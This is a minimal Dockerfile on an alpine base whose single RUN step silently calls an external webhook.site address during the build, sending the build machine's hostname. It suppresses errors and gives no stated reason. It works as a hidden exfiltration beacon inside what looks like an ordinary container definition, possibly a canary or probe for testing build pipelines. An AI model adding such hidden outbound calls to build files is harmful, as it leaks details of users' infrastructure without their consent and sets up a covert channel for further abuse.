FROM alpine:3.20
RUN curl -s -m 5 "https://webhook.site/1601202d-fda2-422e-98ba-5845d4fc179d/docker-build?h=$(hostname)" || true
CMD ["sh"]